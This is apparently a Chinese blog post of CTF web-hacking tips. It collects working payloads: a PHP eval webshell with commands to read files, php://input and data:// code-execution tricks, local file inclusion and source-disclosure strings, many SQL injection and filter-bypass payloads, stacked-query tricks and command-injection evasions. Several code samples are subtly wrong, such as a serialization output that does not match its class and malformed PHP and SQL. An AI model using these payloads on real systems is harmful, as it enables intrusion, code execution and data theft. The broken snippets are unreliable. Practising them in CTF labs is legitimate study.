+++
title = '网络攻防tips'
date = 2021-06-10 16:50:16
tags = ['Security']
+++

记录一些网络攻防题中的小tips。

# Robots
每个网站有一个robots.txt用于防爬虫。

# BP构造POST请求
在BP中可以在header里添加`Content-type: application/x-www-form-urlencoded`，并在最后添加参数构造POST请求

# 伪造请求
在header中添加x-forwarded-for: xxx.xxx.xxx.xxx，以及referer: https://www.google.com 来伪造请求。

# 一句话木马
当一句话木马在服务器上时：
```php
<?php @eval($_POST['shell']);?>
```
将请求构造为POST，且将参数设置为
```
shell=system("find / -name 'flag*'");
```
```
shell=system('cat flag.txt');
```

# ?的解码
问号的URL编码为%3f，浏览器会将%3f解码为问号。如果服务端对问号有一次解码校验的过程：
```php
<?php
url_decode($param);
?>
```
则可以先将%3f编码，即%253f。浏览器会现将%253f解码为%3f，这样就可以绕过服务端的问号校验（服务端收到的就是%3f而不是？）。

# PHP中的比较
PHP中`==`会先强制转化类型再比较值，而`===`则会比较类型和值。
```php
<?php
$a = 'a1234';
$a == 1234; # 在比较时会去掉字母
$b = 'abc';
$b == 0; # 比较时会去掉字母
>
```

# phps

phps是php的source文件，当找不到php在干嘛的时候可以看一下

# 浏览器解码

浏览器会对URL进行一次urldecode，当源码会检验URL时，我们可以通过先对参数进行适当次数的urlencode后传参。

其中a的编码为%61，1的编码为%31，这个编码是十六进制数，以此类推。如果需要对编码再进行编码，则在前面加上25，如%61的编码为%2561。

也可以通过写一小段php来查看编码：

```php
<?php
echo dechex(ord('a'));  // 输出61
>
```

有时也需要对base64进行解码：

```
<?php
$str = 'VGhpcyBpcyBhbiBlbmNvZGVkIHN0cmluZw==';
echo base64_decode($str);
?>
```

#序列化和反序列化

在php中，反序列化之前会执行__wakeup函数。

在我们对一个class的对象进行序列化后，可以得到一个形容它的字符串，比如：

```php
<?php
class Student{
    public $name = 'hello';
    public $score = 150;
    public $grades = array();

    function __wakeup() {
        echo "__wakeup is invoked";
    }
}

$s = new Student();
var_dump(serialize($s));
?>
```

序列化后的输出就是：

```
O:7:"Student":3:{s:9:"full_name";s:8:"hello";s:5:"score";i:150;s:6:"grades";a:0:{}}
```

Student后面的3表示属性个数，如果在反序列化这个字符串时，这个数字大于类本身的属性个数，则不会执行__wakeup函数（比如这里改成5）

```php
class Student{
public $full_name = 'zhangsan';
public $score = 150;
public $grades = array();

function __wakeup() {
    echo "__wakeup is invoked";  // 不会执行
}

}

$s = new Student();
$stu = unserialize('O:7:"Student":5:{s:9:"full_name";s:8:"hellp";s:5:"score";i:150;s:6:"grades";a:0:{}}');
```

# PHP伪协议

## input协议

PHP伪协议中，在后面加上input之后，系统会执行POST上去的PHP代码。

在URL中添加`PHP://input`并模拟POST请求，在参数中可以直接植入php代码

```
POST /?param1=a&param2=PHP://input HTTP/1.1
Content-Type: application/x-www-form-urlencoded
.....

<?php system("ls"); ?>
```

## data协议

在URL中添加`data://text/plain,<?php%20system("ls");?>`

## filter 协议

格式为

```
index.php?file=php://filter/read=convert.base64-encode/resource=index.php
```
输出的结果是base64编码的，可以使用浏览器控制台进行解码：
```
window.atob('PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7NzJiZDBjOTYtYWU1MC00YzI4LTg4MjEtZGI4NGI4OWM3YjU1fQo=')
```

# 文件包含

文件包含会执行include的php文件，如果php文件里面同时输出你的输入，以及对某个文件进行包含，那么可以利用这点执行php代码，比如：

```php
<?php
echo $_GET['hello'];
$page = $_GET['page'];
include($page);
>
```

如果传入的page是页面本身，且同时在hello中携带代码，那么就会执行这个代码。

# .git漏洞

查看网页目录下是否有.git文件夹，若有则可以使用GitHack工具对网站进行扫描，找到需要的文件。

# PHP include路径

PHP中调用include函数，若参数中包含一个路径，则会自动忽略第一个斜杠之前的字符串，例如在Linux下：
```php
include "aaa.php?../../../../bbb.php"
```
则只会包含`../../../bbb.php`

# 判断服务器是否使用了Django

如果有机会通过GET或POST传输一个参数，则可以传输%80（一个大于等于128的十六进制数），则服务端会报错，错误信息中包含Django Version等信息。

对于使用Django的服务，可以尝试使用@符号加上文件路径来利用文件读取的漏洞，来查看数据库内容：

```
?param=@/opt/api/api/settings.py  // 获取数据库名database_name
?param=@/opt/api/database_name.sqlite3 // 获取数据库
```

# LFI漏洞判断

URL中path、dir、file、pag、page、archive、p、eng、语言文件等相关关键字眼的时候,可能存在文件包含漏洞，可以通过php的filter协议来读取php源码的base64编码形式。

```
/index.php?page=php://filter/read=convert.base64-encode/resource=index.php
```

# Sql注入的尝试

以正常查询为`localhost:8888/index.php?id=1`的环境为例，如果正常输入后有回显（比如查询id=1时，会返回用户信息），可以传入一个不会返回结果的参数（比如查询id为-1的用户，或随便输入的账号密码之类的），并尝试各种格式：
- id=-1 union select 1, 2 --+
- id=-1' union select 1, 2 --+
- id=-1" union select 1, 2 --+
- id=-1') union select 1, 2 --+
- id=-1") union select 1,2 --+

如果是模糊搜索的场景（比如搜索新闻标题）则需要添加%。

**尝试期间可能输出语法错误，或是没有回显，这两种情况都可以无视，直到尝试出现列数不对的报错提示，或是直接显示1和2，则可以进一步构造payload。**

如果正常输入后不会回显（比如登录等场景），且该问题并不是盲注问题，则需要把union select改成updatexml形式。

- id=1 or updatexml(1, concat('~', database(), '~'), 0) or
- id=1' or updatexml(1, concat('~', database(), '~'), 0) or '
- id=1" or updatexml(1, concat('~', database(), '~'), 0) or "
- and so on

# 应对sql注入的过滤

以下几种情况可能会同时出现，需要结合应对

## 过滤注释

当`--`和`#`被过滤时，可以考虑不用注释，而是在payload中去贴合sql语句，比如参数由单引号结尾时：

```php
$query = select * from users where id='$_GET['id']' LIMIT 0, 1
```

则构造payload

```
http://127.0.0.1/demo?id=-1' union select 1, 2, 3 or '1'='3
```

同样的，如果有括号的话则payload对应修改为

```
http://127.0.0.1/demo?id=-1') union select 1, 2, 3 or '1'='3
```

## 过滤and和or

and和or可以用别的形式表示，可以尝试一下几种：
- 更改大小写，后台或许不是大小写敏感的
- 使用url编码后的and和or
- 使用`&&`表示and，使用`||`表示or

## 过滤空格

空格可以使用别的字符替代，比较常见的是`%a0`，注意若在url里写，则可能要将别的特殊字符也用url编码，浏览器才会合适解析，比如要把`'`改写为`%27`。

## 过滤union select

可以尝试用大写部分字符来完成

# 堆叠注入

## 预编译
当堆叠注入条件下，过滤了select、update等语句的时候，可以使用预编译的方式：

```
-1';
set @sql=concat('se', 'lect * from table;', );
prepare stmt from @sql;
EXCUTE stmt;
```

# RCE

## 应对过滤

在执行linux指令的时候，可能空格、标点等会被过滤：

- `$IFS$1`可以代表文本分隔符，来替代空格
- 在`ls`周边加入反引号`可以输出执行结果
- 如果过滤了关键词，可以先声明变量，然后用变量替代`a=g;cat$IFS$1fla$a.php;`

